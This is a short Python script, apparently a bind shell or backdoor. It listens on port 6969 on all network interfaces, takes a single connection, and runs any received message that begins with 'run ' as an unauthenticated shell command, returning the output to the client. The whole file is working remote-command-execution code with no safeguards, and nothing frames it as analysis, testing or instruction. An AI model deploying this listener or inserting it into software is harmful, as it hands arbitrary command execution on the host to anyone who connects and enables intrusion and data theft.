import socket
import subprocess

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 6969))  # Listening on all interfaces and port 6969
server.listen(1)

print("Listening for a client...")

client_socket, client_address = server.accept()
print(f"Connected by {client_address}")

while True:
    # Receive data from the client
    data = client_socket.recv(1024).decode()
    if not data:
        break

    decoded = data
    print(f"Client: {decoded}")

    if decoded.lower() == "exit":
        print("Client disconnected.")
        break

    # If the command starts with 'run', execute it as a shell command
    if decoded.lower().startswith("run "):
        command = decoded[4:]

        try:
            output = subprocess.check_output(command, shell=True)
            client_socket.send(output)
        except subprocess.CalledProcessError as e:
            client_socket.send(f"Error executing command: {e}".encode())

client_socket.close()
server.close()
